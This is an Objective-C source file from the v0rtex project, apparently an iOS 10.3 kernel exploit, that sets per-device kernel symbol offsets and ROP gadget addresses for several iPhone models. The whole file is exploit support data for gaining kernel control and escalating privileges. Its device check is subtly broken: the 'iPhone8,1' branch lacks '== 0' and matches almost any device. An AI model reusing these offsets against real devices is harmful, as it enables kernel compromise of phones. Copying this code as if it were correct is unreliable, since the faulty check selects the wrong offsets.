//
//  symbols.m
//  v0rtex
//
//  Created by Ben on 16/12/2017.
//  Copyright © 2017 Sticktron. All rights reserved.
//

#include <sys/utsname.h>
#include "symbols.h"
#include "common.h"

uint64_t OFFSET_ZONE_MAP;
uint64_t OFFSET_KERNEL_MAP;
uint64_t OFFSET_KERNEL_TASK;
uint64_t OFFSET_REALHOST;
uint64_t OFFSET_BZERO;
uint64_t OFFSET_BCOPY;
uint64_t OFFSET_COPYIN;
uint64_t OFFSET_COPYOUT;
uint64_t OFFSET_CHGPROCCNT;
uint64_t OFFSET_KAUTH_CRED_REF;
uint64_t OFFSET_IPC_PORT_ALLOC_SPECIAL;
uint64_t OFFSET_IPC_KOBJECT_SET;
uint64_t OFFSET_IPC_PORT_MAKE_SEND;
uint64_t OFFSET_IOSURFACEROOTUSERCLIENT_VTAB;
uint64_t OFFSET_OSSERIALIZER_SERIALIZE;
uint64_t OFFSET_ROP_LDR_X0_X0_0x10;
uint64_t OFFSET_ROP_ADD_X0_X0_0x10;
uint64_t OFFSET_ROOT_MOUNT_V_NODE;

#import <sys/utsname.h>

BOOL init_symbols()
{
    NSString *ver = [[NSProcessInfo processInfo] operatingSystemVersionString];
    
    struct utsname u;
    uname(&u);
    
    LOG("Device: %s", u.machine);
    LOG("Device Name: %s", u.nodename);
    LOG("Device iOS Version: %@", ver);
    
    if (strcmp(u.machine, "iPhone9,3") == 0)
    {
        if ([ver  isEqual: @"Version 10.3.1 (Build 14E304)"])
        {
            OFFSET_ZONE_MAP                             = 0xfffffff007590478;
            OFFSET_KERNEL_MAP                           = 0xfffffff0075ec050;
            OFFSET_KERNEL_TASK                          = 0xfffffff0075ec048;
            OFFSET_REALHOST                             = 0xfffffff007572ba0;
            OFFSET_BZERO                                = 0xfffffff0070c1f80;
            OFFSET_BCOPY                                = 0xfffffff0070c1dc0;
            OFFSET_COPYIN                               = 0xfffffff0071c6134;
            OFFSET_COPYOUT                              = 0xfffffff0071c6414;
            OFFSET_CHGPROCCNT                           = 0xfffffff007049e4b;
            OFFSET_KAUTH_CRED_REF                       = 0xfffffff0073ada04;
            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070df05c;
            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070f22b4;
            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070deb80;
            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e4a238;
            OFFSET_OSSERIALIZER_SERIALIZE               = 0xfffffff007486530;
            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064ff0a8;
            OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff0074cf02c;
            OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075ec0b0;
        }
    }
    
    else if (strcmp(u.machine, "iPhone8,1"))
    {
        if ([ver isEqual: @"Version 10.3.2 (Build 14F89)"])
        {
            OFFSET_ZONE_MAP                             = 0xfffffff007548478;
            OFFSET_KERNEL_MAP                           = 0xfffffff0075a4050;
            OFFSET_KERNEL_TASK                          = 0xfffffff0075a4048;
            OFFSET_REALHOST                             = 0xfffffff00752aba0;
            OFFSET_BZERO                                = 0xfffffff007081f80;
            OFFSET_BCOPY                                = 0xfffffff007081dc0;
            OFFSET_COPYIN                               = 0xfffffff0071806f4;
            OFFSET_COPYOUT                              = 0xfffffff0071808e8;
            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099e94;
            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad16c;
            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070999b8;
            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006e7c9f8;
            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006b916b8;
            OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075ec0b0;
        }
        else if ([ver isEqual: @"Version 10.3.1 (Build 14E304)"])
        {
            OFFSET_ZONE_MAP                             = 0xfffffff007558478;
            OFFSET_KERNEL_MAP                           = 0xfffffff0075b4050;
            OFFSET_KERNEL_TASK                          = 0xfffffff0075b4048;
            OFFSET_REALHOST                             = 0xfffffff00753aba0;
            OFFSET_BZERO                                = 0xfffffff00708df80;
            OFFSET_BCOPY                                = 0xfffffff00708ddc0;
            OFFSET_COPYIN                               = 0xfffffff00718d3a8;
            OFFSET_COPYOUT                              = 0xfffffff00718d59c;
            OFFSET_CHGPROCCNT                           = 0xfffffff007055e7d;
            OFFSET_KAUTH_CRED_REF                       = 0xfffffff007374b2c;
            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070a611c;
            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070b9374;
            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070a5c40;
            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006eee1b8;
            OFFSET_OSSERIALIZER_SERIALIZE               = 0xfffffff00744d6ac;
            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b5178;
            OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff0074335d0;
            OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075b40b0;
        }
    }
    
    else if (strcmp(u.machine, "iPhone6,1") == 0)
    {
        if ([ver  isEqual: @"Version 10.3.2 (Build 14F89)"])
        {
            OFFSET_ZONE_MAP                             = 0xfffffff00754c478;
            OFFSET_KERNEL_MAP                           = 0xfffffff0075a8050;
            OFFSET_KERNEL_TASK                          = 0xfffffff0075a8048;
            OFFSET_REALHOST                             = 0xfffffff00752eba0;
            OFFSET_BZERO                                = 0xfffffff007081f80;
            OFFSET_BCOPY                                = 0xfffffff007081dc0;
            OFFSET_COPYIN                               = 0xfffffff0071811ec;
            OFFSET_COPYOUT                              = 0xfffffff0071813e0;
            OFFSET_CHGPROCCNT                           = 0xfffffff007049dff;
            OFFSET_KAUTH_CRED_REF                       = 0xfffffff007368be4;
            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff007099f14;
            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070ad1ec;
            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff007099a38;
            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006f25538;
            OFFSET_OSSERIALIZER_SERIALIZE               = 0xfffffff0074419b8;
            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff006526178;
            OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff0074278dc;
            OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075a80b0;
        }
    }
    
    else if (strcmp(u.machine, "iPhone8,2") == 0)
    {
        if ([ver  isEqual: @"Version 10.3.3 (Build 14G60)"])
        {
            OFFSET_ZONE_MAP                             = 0xfffffff007558478;
            OFFSET_KERNEL_MAP                           = 0xfffffff0075b4050;
            OFFSET_KERNEL_TASK                          = 0xfffffff0075b4048;
            OFFSET_REALHOST                             = 0xfffffff00753aba0;
            OFFSET_BZERO                                = 0xfffffff00708df80;
            OFFSET_BCOPY                                = 0xfffffff00708ddc0;
            OFFSET_COPYIN                               = 0xfffffff00718d028;
            OFFSET_COPYOUT                              = 0xfffffff00718d21c;
            OFFSET_CHGPROCCNT                           = 0xfffffff007055dff;
            OFFSET_KAUTH_CRED_REF                       = 0xfffffff007374d90;
            OFFSET_IPC_PORT_ALLOC_SPECIAL               = 0xfffffff0070a60b4;
            OFFSET_IPC_KOBJECT_SET                      = 0xfffffff0070b938c;
            OFFSET_IPC_PORT_MAKE_SEND                   = 0xfffffff0070a5bd8;
            OFFSET_IOSURFACEROOTUSERCLIENT_VTAB         = 0xfffffff006eee1b8;
            OFFSET_OSSERIALIZER_SERIALIZE               = 0xfffffff00744db90;
            OFFSET_ROP_ADD_X0_X0_0x10                   = 0xfffffff0064b2178;
            OFFSET_ROP_LDR_X0_X0_0x10                   = 0xfffffff007433ab4;
            OFFSET_ROOT_MOUNT_V_NODE                    = 0xfffffff0075b40b0;
        }
    }
    
    else
    {
        LOG("Device not supported.");
        return FALSE;
    }
    
    return TRUE;
}
